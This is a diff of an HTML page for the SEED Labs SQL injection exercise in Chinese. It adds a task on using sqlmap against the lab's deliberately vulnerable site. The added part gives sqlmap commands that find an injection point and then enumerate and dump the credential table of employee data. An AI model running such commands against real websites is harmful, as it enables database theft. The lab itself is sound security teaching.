@@ -734,8 +734,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#1-1mysql" class="md-nav__link">
-    1 任务1：熟悉MySQL语句
+  <a href="#1-11mysql" class="md-nav__link">
+    1 任务1.1：熟悉MySQL语句
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-12sqlmap" class="md-nav__link">
+    1 任务1.2：sqlmap工具的使用
   </a>
   
 </li>
@@ -1100,8 +1107,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#1-1mysql" class="md-nav__link">
-    1 任务1：熟悉MySQL语句
+  <a href="#1-11mysql" class="md-nav__link">
+    1 任务1.1：熟悉MySQL语句
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-12sqlmap" class="md-nav__link">
+    1 任务1.2：sqlmap工具的使用
   </a>
   
 </li>
@@ -1152,7 +1166,7 @@
 <p>请从SEED网站下载 <a href="https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/">Labsetup.zip</a> 文件到你的虚拟机，解压缩，进入<code>Labsetup</code>文件夹，使用<code>docker-compose.yml</code>文件来设置实验环境。</p>
 <p><strong>创建容器</strong></p>
 <p>在 /etc/docker/daemon.json 文件中添加 docker 国内镜像源（目的是速度更快），然后使用命令 dcbuild 创建容器</p>
-<div class="highlight"><pre><span></span><code>{
+<p><div class="highlight"><pre><span></span><code>{
         &quot;registry-mirrors&quot;: [
                 &quot;https://hub-mirror.c.163.com&quot;,
                 &quot;https://mirror.baidubce.com&quot;,
@@ -1160,11 +1174,12 @@
         ]       
 } 
 </code></pre></div>
+创建容器</p>
 <div class="highlight"><pre><span></span><code>$ dcbuild
 </code></pre></div>
 <p><strong>启动容器</strong></p>
 <p>容器创建成功后，才能启动容器</p>
-<div class="highlight"><pre><span></span><code>$ dcbuild
+<div class="highlight"><pre><span></span><code>$ dcup
 </code></pre></div>
 <p><strong>查看容器信息</strong></p>
 <p>本次实验中用到的两个容器一个是web应用程序，一个是MySQL数据库</p>
@@ -1172,7 +1187,7 @@
 20c3333a8cd5  www-10.9.0.5
 4a101760d086  mysql-10.9.0.6
 </code></pre></div>
-<h2 id="1-1mysql">1 任务1：熟悉MySQL语句</h2>
+<h2 id="1-11mysql">1 任务1.1：熟悉MySQL语句</h2>
 <p>本任务的目标是通过使用提供的数据库来熟悉SQL命令。web应用程序使用的数据存储在MySQL数据库中，该数据库托管在MySQL容器上。</p>
 <p>我们已经创建了一个名为<code>sqllab_users</code>的数据库，其中包含一个名为<code>credential</code>的表。该表存储每个员工的个人信息(例如<code>eid</code>、密码、工资、ssn等)。在这个任务中，你需要使用数据库来熟悉SQL查询。</p>
 <p>请在MySQL容器上获取一个shell(参见容器手册中的说明)。</p>
@@ -1193,6 +1208,29 @@ mysql&gt; show tables;
 +------------------------+
 </code></pre></div>
 <p>运行上述命令后，需要使用SQL命令打印员工Alice的所有概要信息。请提供你的结果截图。</p>
+<h2 id="1-12sqlmap">1 任务1.2：sqlmap工具的使用</h2>
+<p>sqlmap是一个使用python语言开发的开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件等。</p>
+<p>实验室环境中已经安装，如果自行安装，请用下面的命令安装</p>
+<div class="highlight"><pre><span></span><code>apt install sqlmap
+</code></pre></div>
+<p>安装好后，执行下面的命令可以帮助你了解 sqlmap 的相关命令</p>
+<div class="highlight"><pre><span></span><code>sqlmap -h  或者 sqlmap --h
+</code></pre></div>
+<p>下面是本次实验用到的sqlmap命令，通过这几条命令可以将我们搭建的web网站服务器的数据库和数据表信息找出来，并能够检测到web的注入点：</p>
+<div class="highlight"><pre><span></span><code>//检测某个url存在的漏洞，url必须得有接收参数的地方（例如：username=），否则的话就不存在漏洞。
+//可以看到很多提示信息，黄色[WARNING]表示不存在注入，加粗的绿色[INFO]信息大家关注是可能存在问题的点
+sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; 
+
+//读取某个url用到的数据库系统中存在的数据库名称
+sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; --DBS
+
+//读取某个数据库中的所有表
+sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; -D 数据库名 --tables
+
+//将某个表中的所有信息dump下来
+sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; -D 数据库名 -T 数据表名 --dump
+</code></pre></div>
+<p>运行上述命令后，可以将credential中的所有信息dump下来。请提供你的结果截图，并根据第一条命令找出可以注入的信息点。</p>
 <h2 id="2-2select">2 任务2：Select语句下的注入攻击</h2>
 <p>SQL注入基本上是一种技术，通过这种技术，攻击者可以执行他们自己的恶意SQL语句，通常称为<code>payload</code>。通过恶意SQL语句，攻击者可以从受害数据库中窃取信息;更糟糕的是，他们可能会对数据库进行更改。我们的员工管理web应用程序有SQL注入漏洞，这里模仿了开发人员经常犯的错误。</p>
 <p>我们将使用www.seed-server.com的登录页面来完成这项任务。登录界面如图1所示。它要求用户提供用户名和密码。web应用程序基于这两段数据验证用户身份，因此只有知道密码的员工才能登录。作为攻击者，你的工作是在不知道任何员工的凭证的情况下登录到web应用程序。</p>
